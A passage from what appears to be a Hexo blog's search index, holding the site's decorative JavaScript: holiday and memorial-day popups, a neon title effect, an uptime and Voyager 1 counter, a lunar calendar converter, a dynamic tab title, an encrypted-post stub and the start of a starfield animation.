        <content type="html"><![CDATA[var d = new Date();m = d.getMonth() + 1;dd = d.getDate();y = d.getFullYear();// 公祭日if (m == 9 && dd == 18) {    document.getElementsByTagName("html")[0].setAttribute("style", "filter: grayscale(60%);");    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("今天是九一八事变" + (y - 1931).toString() + "周年纪念日\n🪔勿忘国耻，振兴中华🪔");        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 7 && dd == 7) {    document.getElementsByTagName("html")[0].setAttribute("style", "filter: grayscale(60%);");    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("今天是卢沟桥事变" + (y - 1937).toString() + "周年纪念日\n🪔勿忘国耻，振兴中华🪔");        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 12 && dd == 13) {    document.getElementsByTagName("html")[0].setAttribute("style", "filter: grayscale(60%);");    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("今天是南京大屠杀" + (y - 1937).toString() + "周年纪念日\n🪔勿忘国耻，振兴中华🪔");        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 8 && dd == 14) {    document.getElementsByTagName("html")[0].setAttribute("style", "filter: grayscale(60%);");    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("今天是世界慰安妇纪念日\n🪔勿忘国耻，振兴中华🪔");        sessionStorage.setItem("isPopupWindow", "1");    }}// 节假日if (m == 10 && dd <= 3) {//国庆节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("祝祖国" + (y - 1949).toString() + "岁生日快乐！");        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 8 && dd == 15) {//搞来玩的，小日子投降    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("小日子已经投降" + (y - 1945).toString() + "年了😃");        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 1 && dd == 1) {//元旦节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire(y.toString() + "年元旦快乐！🎉");        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 3 && dd == 8) {//妇女节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("各位女神们，妇女节快乐！👩");        sessionStorage.setItem("isPopupWindow", "1");    }}l = ["非常抱歉，因为不可控原因，博客将于明天停止运营！", "好消息，日本没了！", "美国垮了，原因竟然是川普！", "微软垮了！", "你的电脑已经过载，建议立即关机！", "你知道吗？站长很喜欢你哦！", "一分钟有61秒哦", "你喜欢的人跟别人跑了！"]if (m == 4 && dd == 1) {//愚人节，随机谎话    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire(l[Math.floor(Math.random() * l.length)]);        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 5 && dd == 1) {//劳动节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("劳动节快乐\n为各行各业辛勤工作的人们致敬！");        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 5 && dd == 4) {//青年节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("青年节快乐\n青春不是回忆逝去,而是把握现在！");        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 5 && dd == 20) {//520    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("今年是520情人节\n快和你喜欢的人一起过吧！💑");        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 7 && dd == 1) {//建党节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("祝中国共产党" + (y - 1921).toString() + "岁生日快乐！");        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 9 && dd == 10) {//教师节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("各位老师们教师节快乐！👩‍🏫");        sessionStorage.setItem("isPopupWindow", "1");    }}if (m == 12 && dd == 25) {//圣诞节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("圣诞节快乐！🎄");        sessionStorage.setItem("isPopupWindow", "1");    }}//传统节日部分if ((y == 2023 && m == 4 && dd == 5) || (y == 2024 && m == 4 && dd == 4) || (y == 2025 && m == 4 && dd == 4)) {//清明节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("清明时节雨纷纷,一束鲜花祭故人💐");        sessionStorage.setItem("isPopupWindow", "1");    }}if ((y == 2023 && m == 12 && dd == 22) || (y == 2024 && m == 12 && dd == 21) || (y == 2025 && m == 12 && dd == 21)) {//冬至    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("冬至快乐\n快吃上一碗热热的汤圆和饺子吧🧆");        sessionStorage.setItem("isPopupWindow", "1");    }}var lunar = calendarFormatter.solar2lunar();//农历采用汉字计算，防止出现闰月导致问题if ((lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初六") || (lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初五") || (lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初四") || (lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初三") || (lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初二") || (lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初一") || (lunar["IMonthCn"] == "腊月" && lunar["IDayCn"] == "三十") || (lunar["IMonthCn"] == "腊月" && lunar["IDayCn"] == "廿九")) {    //春节，本来只有大年三十到初六，但是有时候除夕是大年二十九，所以也加上了    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire(y.toString() + "年新年快乐\n🎊祝你心想事成，诸事顺利🎊");        sessionStorage.setItem("isPopupWindow", "1");    }}if ((lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "十五")) {    //元宵节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("元宵节快乐\n送你一个大大的灯笼🧅");        sessionStorage.setItem("isPopupWindow", "1");    }}if ((lunar["IMonthCn"] == "五月" && lunar["IDayCn"] == "初五")) {    //端午节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("端午节快乐\n请你吃一条粽子🍙");        sessionStorage.setItem("isPopupWindow", "1");    }}if ((lunar["IMonthCn"] == "七月" && lunar["IDayCn"] == "初七")) {    //七夕节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("七夕节快乐\n黄昏后,柳梢头,牛郎织女来碰头");        sessionStorage.setItem("isPopupWindow", "1");    }}if ((lunar["IMonthCn"] == "八月" && lunar["IDayCn"] == "十五")) {    //中秋节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("中秋节快乐\n请你吃一块月饼🍪");        sessionStorage.setItem("isPopupWindow", "1");    }}if ((lunar["IMonthCn"] == "九月" && lunar["IDayCn"] == "初九")) {    //重阳节    if (sessionStorage.getItem("isPopupWindow") != "1") {        Swal.fire("重阳节快乐\n独在异乡为异客，每逢佳节倍思亲");        sessionStorage.setItem("isPopupWindow", "1");    }}// 切换主题提醒// if (y == 2022 && m == 12 && (dd >= 18 && dd <= 20)) {//     if (sessionStorage.getItem("isPopupWindow") != "1") {//         Swal.fire("网站换成冬日限定主题啦⛄");//         sessionStorage.setItem("isPopupWindow", "1");//     }// }]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/light.js"/>
      <url>/js/light.js</url>
      
        <content type="html"><![CDATA[// 霓虹灯效果// 颜色数组var arr = ["#39c5bb", "#f14747", "#f1a247", "#f1ee47", "#b347f1", "#1edbff", "#ed709b", "#5636ed"];// 颜色索引var idx = 0;// 切换颜色function changeColor() {    // 仅夜间模式才启用    if (document.getElementsByTagName('html')[0].getAttribute('data-theme') == 'dark') {        if (document.getElementById("site-name"))            document.getElementById("site-name").style.textShadow = arr[idx] + " 0 0 15px";        if (document.getElementById("site-title"))            document.getElementById("site-title").style.textShadow = arr[idx] + " 0 0 15px";        if (document.getElementById("site-subtitle"))            document.getElementById("site-subtitle").style.textShadow = arr[idx] + " 0 0 10px";        if (document.getElementById("post-info"))            document.getElementById("post-info").style.textShadow = arr[idx] + " 0 0 5px";        try {            document.getElementsByClassName("author-info__name")[0].style.textShadow = arr[idx] + " 0 0 12px";            document.getElementsByClassName("author-info__description")[0].style.textShadow = arr[idx] + " 0 0 12px";        } catch {                    }        idx++;        if (idx == 8) {            idx = 0;        }    } else {        // 白天模式恢复默认        if (document.getElementById("site-name"))            document.getElementById("site-name").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("site-title"))            document.getElementById("site-title").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("site-subtitle"))            document.getElementById("site-subtitle").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("post-info"))            document.getElementById("post-info").style.textShadow = "#1e1e1ee0 1px 1px 1px";        try {            document.getElementsByClassName("author-info__name")[0].style.textShadow = "";            document.getElementsByClassName("author-info__description")[0].style.textShadow = "";        } catch {                    }    }}// 开启计时器window.onload = setInterval(changeColor, 1200);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime.js"/>
      <url>/js/runtime.js</url>
      
        <content type="html"><![CDATA[var now = new Date;function createtime() {    now.setTime(now.getTime() + 1e3);    var e = new Date("11/19/2022 00:00:00"),        t = Math.trunc(234e8 + (now - e) / 1e3 * 17),        a = (t / 1496e5).toFixed(6),        r = new Date("11/26/2022 00:00:00"),        o = (now - r) / 1e3 / 60 / 60 / 24,        i = Math.floor(o),        n = (now - r) / 1e3 / 60 / 60 - 24 * i,        s = Math.floor(n);    1 == String(s).length && (s = "0" + s);    var l = (now - r) / 1e3 / 60 - 1440 * i - 60 * s,        g = Math.floor(l);    1 == String(g).length && (g = "0" + g);    var d = (now - r) / 1e3 - 86400 * i - 3600 * s - 60 * g,        c = Math.round(d);    1 == String(c).length && (c = "0" + c);    let h = "";    h = s < 18 && s >= 9 ? `<img class='boardsign' src='https://img.shields.io/badge/F小屋-上班摸鱼中-6adea8?style=social&logo=cakephp' title='距离月入25k也就还差一个大佬带我~'><br> 本站居然运行了 ${i} 天 ${s} 小时 ${g} 分 ${c} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀 <br> 再看看那个光点，它就在这里，这是家园，这是我们 —— 你所爱的每一个人，你认识的一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨ ` : `<img class='boardsign' src='https://img.shields.io/badge/F小屋-打烊休息啦-6adea8?style=social&logo=coffeescript' title='今天一定早睡~'><br> 本站居然运行了 ${i} 天 ${s} 小时 ${g} 分 ${c} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀 <br> 我不怕死亡，唯独惧怕失去思考✨ `, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = h)}setInterval((() => {    createtime()}), 1e3);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/lunar.js"/>
      <url>/js/lunar.js</url>
      
        <content type="html"><![CDATA[var lunarInfo=[19416,19168,42352,21717,53856,55632,91476,22176,39632,21970,19168,42422,42192,53840,119381,46400,54944,44450,38320,84343,18800,42160,46261,27216,27968,109396,11104,38256,21234,18800,25958,54432,59984,28309,23248,11104,100067,37600,116951,51536,54432,120998,46416,22176,107956,9680,37584,53938,43344,46423,27808,46416,86869,19872,42416,83315,21168,43432,59728,27296,44710,43856,19296,43748,42352,21088,62051,55632,23383,22176,38608,19925,19152,42192,54484,53840,54616,46400,46752,103846,38320,18864,43380,42160,45690,27216,27968,44870,43872,38256,19189,18800,25776,29859,59984,27480,23232,43872,38613,37600,51552,55636,54432,55888,30034,22176,43959,9680,37584,51893,43344,46240,47780,44368,21977,19360,42416,86390,21168,43312,31060,27296,44368,23378,19296,42726,42208,53856,60005,54576,23200,30371,38608,19195,19152,42192,118966,53840,54560,56645,46496,22224,21938,18864,42359,42160,43600,111189,27936,44448,84835,37744,18936,18800,25776,92326,59984,27424,108228,43744,41696,53987,51552,54615,54432,55888,23893,22176,42704,21972,21200,43448,43344,46240,46758,44368,21920,43940,42416,21168,45683,26928,29495,27296,44368,84821,19296,42352,21732,53600,59752,54560,55968,92838,22224,19168,43476,41680,53584,62034,54560],solarMonth=[31,28,31,30,31,30,31,31,30,31,30,31],Gan=["甲","乙","丙","丁","戊","己","庚","辛","壬","癸"],Zhi=["子","丑","寅","卯","辰","巳","午","未","申","酉","戌","亥"],Animals=["鼠","牛","虎","兔","龙","蛇","马","羊","猴","鸡","狗","猪"],solarTerm=["小寒","大寒","立春","雨水","惊蛰","春分","清明","谷雨","立夏","小满","芒种","夏至","小暑","大暑","立秋","处暑","白露","秋分","寒露","霜降","立冬","小雪","大雪","冬至"],sTermInfo=["9778397bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf97c3598082c95f8c965cc920f","97bd0b06bdb0722c965ce1cfcc920f","b027097bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf97c359801ec95f8c965cc920f","97bd0b06bdb0722c965ce1cfcc920f","b027097bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf97c359801ec95f8c965cc920f","97bd0b06bdb0722c965ce1cfcc920f","b027097bd097c36b0b6fc9274c91aa","9778397bd19801ec9210c965cc920e","97b6b97bd19801ec95f8c965cc920f","97bd09801d98082c95f8e1cfcc920f","97bd097bd097c36b0b6fc9210c8dc2","9778397bd197c36c9210c9274c91aa","97b6b97bd19801ec95f8c965cc920e","97bd09801d98082c95f8e1cfcc920f","97bd097bd097c36b0b6fc9210c8dc2","9778397bd097c36c9210c9274c91aa","97b6b97bd19801ec95f8c965cc920e","97bcf97c3598082c95f8e1cfcc920f","97bd097bd097c36b0b6fc9210c8dc2","9778397bd097c36c9210c9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf97c3598082c95f8c965cc920f","97bd097bd097c35b0b6fc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf97c3598082c95f8c965cc920f","97bd097bd097c35b0b6fc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf97c359801ec95f8c965cc920f","97bd097bd097c35b0b6fc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf97c359801ec95f8c965cc920f","97bd097bd097c35b0b6fc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf97c359801ec95f8c965cc920f","97bd097bd07f595b0b6fc920fb0722","9778397bd097c36b0b6fc9210c8dc2","9778397bd19801ec9210c9274c920e","97b6b97bd19801ec95f8c965cc920f","97bd07f5307f595b0b0bc920fb0722","7f0e397bd097c36b0b6fc9210c8dc2","9778397bd097c36c9210c9274c920e","97b6b97bd19801ec95f8c965cc920f","97bd07f5307f595b0b0bc920fb0722","7f0e397bd097c36b0b6fc9210c8dc2","9778397bd097c36c9210c9274c91aa","97b6b97bd19801ec9210c965cc920e","97bd07f1487f595b0b0bc920fb0722","7f0e397bd097c36b0b6fc9210c8dc2","9778397bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf7f1487f595b0b0bb0b6fb0722","7f0e397bd097c35b0b6fc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf7f1487f595b0b0bb0b6fb0722","7f0e397bd097c35b0b6fc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf7f1487f531b0b0bb0b6fb0722","7f0e397bd097c35b0b6fc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c965cc920e","97bcf7f1487f531b0b0bb0b6fb0722","7f0e397bd07f595b0b6fc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b97bd19801ec9210c9274c920e","97bcf7f0e47f531b0b0bb0b6fb0722","7f0e397bd07f595b0b0bc920fb0722","9778397bd097c36b0b6fc9210c91aa","97b6b97bd197c36c9210c9274c920e","97bcf7f0e47f531b0b0bb0b6fb0722","7f0e397bd07f595b0b0bc920fb0722","9778397bd097c36b0b6fc9210c8dc2","9778397bd097c36c9210c9274c920e","97b6b7f0e47f531b0723b0b6fb0722","7f0e37f5307f595b0b0bc920fb0722","7f0e397bd097c36b0b6fc9210c8dc2","9778397bd097c36b0b70c9274c91aa","97b6b7f0e47f531b0723b0b6fb0721","7f0e37f1487f595b0b0bb0b6fb0722","7f0e397bd097c35b0b6fc9210c8dc2","9778397bd097c36b0b6fc9274c91aa","97b6b7f0e47f531b0723b0b6fb0721","7f0e27f1487f595b0b0bb0b6fb0722","7f0e397bd097c35b0b6fc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b7f0e47f531b0723b0b6fb0721","7f0e27f1487f531b0b0bb0b6fb0722","7f0e397bd097c35b0b6fc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b7f0e47f531b0723b0b6fb0721","7f0e27f1487f531b0b0bb0b6fb0722","7f0e397bd097c35b0b6fc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b7f0e47f531b0723b0b6fb0721","7f0e27f1487f531b0b0bb0b6fb0722","7f0e397bd07f595b0b0bc920fb0722","9778397bd097c36b0b6fc9274c91aa","97b6b7f0e47f531b0723b0787b0721","7f0e27f0e47f531b0b0bb0b6fb0722","7f0e397bd07f595b0b0bc920fb0722","9778397bd097c36b0b6fc9210c91aa","97b6b7f0e47f149b0723b0787b0721","7f0e27f0e47f531b0723b0b6fb0722","7f0e397bd07f595b0b0bc920fb0722","9778397bd097c36b0b6fc9210c8dc2","977837f0e37f149b0723b0787b0721","7f07e7f0e47f531b0723b0b6fb0722","7f0e37f5307f595b0b0bc920fb0722","7f0e397bd097c35b0b6fc9210c8dc2","977837f0e37f14998082b0787b0721","7f07e7f0e47f531b0723b0b6fb0721","7f0e37f1487f595b0b0bb0b6fb0722","7f0e397bd097c35b0b6fc9210c8dc2","977837f0e37f14998082b0787b06bd","7f07e7f0e47f531b0723b0b6fb0721","7f0e27f1487f531b0b0bb0b6fb0722","7f0e397bd097c35b0b6fc920fb0722","977837f0e37f14998082b0787b06bd","7f07e7f0e47f531b0723b0b6fb0721","7f0e27f1487f531b0b0bb0b6fb0722","7f0e397bd097c35b0b6fc920fb0722","977837f0e37f14998082b0787b06bd","7f07e7f0e47f531b0723b0b6fb0721","7f0e27f1487f531b0b0bb0b6fb0722","7f0e397bd07f595b0b0bc920fb0722","977837f0e37f14998082b0787b06bd","7f07e7f0e47f531b0723b0b6fb0721","7f0e27f1487f531b0b0bb0b6fb0722","7f0e397bd07f595b0b0bc920fb0722","977837f0e37f14998082b0787b06bd","7f07e7f0e47f149b0723b0787b0721","7f0e27f0e47f531b0b0bb0b6fb0722","7f0e397bd07f595b0b0bc920fb0722","977837f0e37f14998082b0723b06bd","7f07e7f0e37f149b0723b0787b0721","7f0e27f0e47f531b0723b0b6fb0722","7f0e397bd07f595b0b0bc920fb0722","977837f0e37f14898082b0723b02d5","7ec967f0e37f14998082b0787b0721","7f07e7f0e47f531b0723b0b6fb0722","7f0e37f1487f595b0b0bb0b6fb0722","7f0e37f0e37f14898082b0723b02d5","7ec967f0e37f14998082b0787b0721","7f07e7f0e47f531b0723b0b6fb0722","7f0e37f1487f531b0b0bb0b6fb0722","7f0e37f0e37f14898082b0723b02d5","7ec967f0e37f14998082b0787b06bd","7f07e7f0e47f531b0723b0b6fb0721","7f0e37f1487f531b0b0bb0b6fb0722","7f0e37f0e37f14898082b072297c35","7ec967f0e37f14998082b0787b06bd","7f07e7f0e47f531b0723b0b6fb0721","7f0e27f1487f531b0b0bb0b6fb0722","7f0e37f0e37f14898082b072297c35","7ec967f0e37f14998082b0787b06bd","7f07e7f0e47f531b0723b0b6fb0721","7f0e27f1487f531b0b0bb0b6fb0722","7f0e37f0e366aa89801eb072297c35","7ec967f0e37f14998082b0787b06bd","7f07e7f0e47f149b0723b0787b0721","7f0e27f1487f531b0b0bb0b6fb0722","7f0e37f0e366aa89801eb072297c35","7ec967f0e37f14998082b0723b06bd","7f07e7f0e47f149b0723b0787b0721","7f0e27f0e47f531b0723b0b6fb0722","7f0e37f0e366aa89801eb072297c35","7ec967f0e37f14998082b0723b06bd","7f07e7f0e37f14998083b0787b0721","7f0e27f0e47f531b0723b0b6fb0722","7f0e37f0e366aa89801eb072297c35","7ec967f0e37f14898082b0723b02d5","7f07e7f0e37f14998082b0787b0721","7f07e7f0e47f531b0723b0b6fb0722","7f0e36665b66aa89801e9808297c35","665f67f0e37f14898082b0723b02d5","7ec967f0e37f14998082b0787b0721","7f07e7f0e47f531b0723b0b6fb0722","7f0e36665b66a449801e9808297c35","665f67f0e37f14898082b0723b02d5","7ec967f0e37f14998082b0787b06bd","7f07e7f0e47f531b0723b0b6fb0721","7f0e36665b66a449801e9808297c35","665f67f0e37f14898082b072297c35","7ec967f0e37f14998082b0787b06bd","7f07e7f0e47f531b0723b0b6fb0721","7f0e26665b66a449801e9808297c35","665f67f0e37f1489801eb072297c35","7ec967f0e37f14998082b0787b06bd","7f07e7f0e47f531b0723b0b6fb0721","7f0e27f1487f531b0b0bb0b6fb0722"],nStr1=["日","一","二","三","四","五","六","七","八","九","十"],nStr2=["初","十","廿","卅"],nStr3=["正","二","三","四","五","六","七","八","九","十","冬","腊"];function lYearDays(b){var f,c=348;for(f=32768;f>8;f>>=1)c+=lunarInfo[b-1900]&f?1:0;return c+leapDays(b)}function leapMonth(b){return 15&lunarInfo[b-1900]}function leapDays(b){return leapMonth(b)?65536&lunarInfo[b-1900]?30:29:0}function monthDays(b,f){return f>12||f<1?-1:lunarInfo[b-1900]&65536>>f?30:29}function solarDays(b,f){if(f>12||f<1)return-1;var c=f-1;return 1===c?b%4==0&&b%100!=0||b%400==0?29:28:solarMonth[c]}function toGanZhiYear(b){var f=(b-3)%10,c=(b-3)%12;return 0===f&&(f=10),0===c&&(c=12),Gan[f-1]+Zhi[c-1]}function toAstro(b,f){return"魔羯水瓶双鱼白羊金牛双子巨蟹狮子处女天秤天蝎射手魔羯".substr(2*b-(f<[20,19,21,21,21,22,23,23,23,23,22,22][b-1]?2:0),2)+"座"}function toGanZhi(b){return Gan[b%10]+Zhi[b%12]}function getTerm(b,f){if(b<1900||b>2100)return-1;if(f<1||f>24)return-1;var c=sTermInfo[b-1900],e=[parseInt("0x"+c.substr(0,5)).toString(),parseInt("0x"+c.substr(5,5)).toString(),parseInt("0x"+c.substr(10,5)).toString(),parseInt("0x"+c.substr(15,5)).toString(),parseInt("0x"+c.substr(20,5)).toString(),parseInt("0x"+c.substr(25,5)).toString()],a=[e[0].substr(0,1),e[0].substr(1,2),e[0].substr(3,1),e[0].substr(4,2),e[1].substr(0,1),e[1].substr(1,2),e[1].substr(3,1),e[1].substr(4,2),e[2].substr(0,1),e[2].substr(1,2),e[2].substr(3,1),e[2].substr(4,2),e[3].substr(0,1),e[3].substr(1,2),e[3].substr(3,1),e[3].substr(4,2),e[4].substr(0,1),e[4].substr(1,2),e[4].substr(3,1),e[4].substr(4,2),e[5].substr(0,1),e[5].substr(1,2),e[5].substr(3,1),e[5].substr(4,2)];return parseInt(a[f-1])}function toChinaMonth(b){if(b>12||b<1)return-1;var f=nStr3[b-1];return f+="月"}function toChinaDay(b){var f;switch(b){case 10:f="初十";break;case 20:f="二十";break;case 30:f="三十";break;default:f=nStr2[Math.floor(b/10)],f+=nStr1[b%10]}return f}function getAnimal(b){return Animals[(b-4)%12]}function solar2lunar(b,f,c){if(b<1900||b>2100)return-1;if(1900===b&&1===f&&c<31)return-1;var e,a,r=null,t=0;b=(r=b?new Date(b,parseInt(f)-1,c):new Date).getFullYear(),f=r.getMonth()+1,c=r.getDate();var d=(Date.UTC(r.getFullYear(),r.getMonth(),r.getDate())-Date.UTC(1900,0,31))/864e5;for(e=1900;e<2101&&d>0;e++)d-=t=lYearDays(e);d<0&&(d+=t,e--);var n=new Date,s=!1;n.getFullYear()===b&&n.getMonth()+1===f&&n.getDate()===c&&(s=!0);var u=r.getDay(),o=nStr1[u];0===u&&(u=7);var l=e;a=leapMonth(e);var i=!1;for(e=1;e<13&&d>0;e++)a>0&&e===a+1&&!1===i?(--e,i=!0,t=leapDays(l)):t=monthDays(l,e),!0===i&&e===a+1&&(i=!1),d-=t;0===d&&a>0&&e===a+1&&(i?i=!1:(i=!0,--e)),d<0&&(d+=t,--e);var h=e,D=d+1,g=f-1,v=toGanZhiYear(l),y=getTerm(b,2*f-1),m=getTerm(b,2*f),p=toGanZhi(12*(b-1900)+f+11);c>=y&&(p=toGanZhi(12*(b-1900)+f+12));var M=!1,T=null;y===c&&(M=!0,T=solarTerm[2*f-2]),m===c&&(M=!0,T=solarTerm[2*f-1]);var I=toGanZhi(Date.UTC(b,g,1,0,0,0,0)/864e5+25567+10+c-1),C=toAstro(f,c);return{lYear:l,lMonth:h,lDay:D,Animal:getAnimal(l),IMonthCn:(i?"闰":"")+toChinaMonth(h),IDayCn:toChinaDay(D),cYear:b,cMonth:f,cDay:c,gzYear:v,gzMonth:p,gzDay:I,isToday:s,isLeap:i,nWeek:u,ncWeek:"星期"+o,isTerm:M,Term:T,astro:C}}var calendarFormatter={solar2lunar:function(b,f,c){return solar2lunar(b,f,c)},lunar2solar:function(b,f,c,e){if((e=!!e)&&leapMonth!==f)return-1;if(2100===b&&12===f&&c>1||1900===b&&1===f&&c<31)return-1;var a=monthDays(b,f),r=a;if(e&&(r=leapDays(b,f)),b<1900||b>2100||c>r)return-1;for(var t=0,d=1900;d<b;d++)t+=lYearDays(d);var n=0,s=!1;for(d=1;d<f;d++)n=leapMonth(b),s||n<=d&&n>0&&(t+=leapDays(b),s=!0),t+=monthDays(b,d);e&&(t+=a);var u=Date.UTC(1900,1,30,0,0,0),o=new Date(864e5*(t+c-31)+u);return solar2lunar(o.getUTCFullYear(),o.getUTCMonth()+1,o.getUTCDate())}};]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/tittle.js"/>
      <url>/js/tittle.js</url>
      
        <content type="html"><![CDATA[//动态标题var OriginTitile = document.title;var titleTime;document.addEventListener('visibilitychange', function () {  if (document.hidden) {    //离开当前页面时标签显示内容    document.title = '👀跑哪里去了~';    clearTimeout(titleTime);  } else {    //返回当前页面时标签显示内容    document.title = '🐖抓到你啦～';    //两秒后变回正常标题    titleTime = setTimeout(function () {      document.title = OriginTitile;    }, 2000);  }});]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>凄风苦雨一身贫，伤心往事谁人听</title>
      <link href="/password-protected/index.html"/>
      <url>/password-protected/index.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="这是一个无效的密码。请进行检查并重试。" data-whm="这些解密的内容可能会改变，但您仍然可以查看。">  <script id="hbeData" type="hbeData" data-hmacdigest="0314475e79c6e35bbc013c27f97fbb637ffeeb79bc1425d866cb55a959e74d1e">d7f91e15485133d7ea3ffaf04b70b21a6fcb8f5c2ec87205325158de0381667dfaff24a7f9b9c007d75f8dd99cb96677307e785f04ebc8f2f2c32cd90ab0304d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">在此处输入密码解密文件</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/universe.js"/>
      <url>/js/universe.js</url>
      
        <content type="html"><![CDATA[function dark() {window.requestAnimationFrame=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame;var n,e,i,h,t=.05,s=document.getElementById("universe"),o=!0,a="180,184,240",r="226,225,142",d="226,225,224",c=[];function f(){n=window.innerWidth,e=window.innerHeight,i=.216*n,s.setAttribute("width",n),s.setAttribute("height",e)}function u(){h.clearRect(0,0,n,e);for(var t=c.length,i=0;i<t;i++){var s=c[i];s.move(),s.fadeIn(),s.fadeOut(),s.draw()}}function y(){this.reset=function(){this.giant=m(3),this.comet=!this.giant&&!o&&m(10),this.x=l(0,n-10),this.y=l(0,e),this.r=l(1.1,2.6),this.dx=l(t,6*t)+(this.comet+1-1)*t*l(50,120)+2*t,this.dy=-l(t,6*t)-(this.comet+1-1)*t*l(50,120),this.fadingOut=null,this.fadingIn=!0,this.opacity=0,this.opacityTresh=l(.2,1-.4*(this.comet+1-1)),this.do=l(5e-4,.002)+.001*(this.comet+1-1)},this.fadeIn=function(){this.fadingIn&&(this.fadingIn=!(this.opacity>this.opacityTresh),this.opacity+=this.do)},this.fadeOut=function(){this.fadingOut&&(this.fadingOut=!(this.opacity<0),this.opacity-=this.do/2,(this.x>n||this.y<0)&&(this.fadingOut=!1,this.reset()))},this.draw=function(){if(h.beginPath(),this.giant)h.fillStyle="rgba("+a+","+this.opacity+")",h.arc(this.x,this.y,2,0,2*Math.PI,!1);else if(this.comet){h.fillStyle="rgba("+d+","+this.opacity+")",h.arc(this.x,this.y,1.5,0,2*Math.PI,!1);for(var t=0;t<30;t++)h.fillStyle="rgba("+d+","+(this.opacity-this.opacity/20*t)+")",h.rect(this.x-this.dx/4*t,this.y-this.dy/4*t-2,2,2),h.fill()}else 